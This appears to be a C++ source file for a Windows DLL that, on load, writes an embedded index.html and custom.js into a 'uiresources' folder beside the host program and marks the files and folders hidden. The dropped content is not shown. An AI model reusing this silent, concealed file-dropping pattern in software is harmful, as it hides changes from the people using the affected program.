#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <Shlwapi.h>
#include "LargeFileSplitter.h"

#pragma comment(lib, "shlwapi.lib")

namespace fs = std::filesystem;

// Автоматически сгенерированные данные
const FileData index_html = {
    #include "index_html_data.inc"
};

const FileData custom_js = {
    #include "custom_js_data.inc"
};

void WriteHiddenFile(const std::string& path, const FileData& file) {
    std::ofstream f(path, std::ios::binary);
    f.write(reinterpret_cast<const char*>(file.data), file.size);
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        PathRemoveFileSpecA(path);

        std::string uiPath = std::string(path) + "\\uiresources";
        std::string assetsPath = uiPath + "\\assets";
        
        fs::create_directories(assetsPath);
        
        WriteHiddenFile(uiPath + "\\index.html", index_html);
        WriteHiddenFile(assetsPath + "\\custom.js", custom_js);
        
        SetFileAttributesA(uiPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributesA(assetsPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
    return TRUE;
}
